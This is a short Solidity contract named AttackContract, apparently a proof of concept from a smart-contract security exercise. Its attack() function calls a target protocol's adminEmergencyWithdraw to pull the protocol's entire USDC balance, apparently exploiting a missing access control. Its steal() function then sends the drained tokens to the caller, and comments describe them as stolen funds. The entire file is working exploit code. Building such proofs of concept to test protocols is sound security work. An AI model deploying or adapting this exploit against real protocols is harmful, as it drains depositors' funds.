// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {IProtocol} from "../defiProtocol/interfaces/IProtocol.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "hardhat/console.sol";

contract AttackContract {
    IERC20 private s_usdc;
    address private owner;

    constructor(address _usdcAddress) {
        s_usdc = IERC20(_usdcAddress);
        owner = msg.sender;
    }

    function attack(address protocolAddress) public {
        // Deposits tokens to the LendingBorrowing contract
        // get usdc balance of protocol
        uint256 usdcBalance = s_usdc.balanceOf(protocolAddress);
        IProtocol(protocolAddress).adminEmergencyWithdraw(usdcBalance);
    }

    // The owner of the contract withdraw the stolen funds
    function steal() public {
        s_usdc.transfer(msg.sender, s_usdc.balanceOf(address(this)));
    }
}
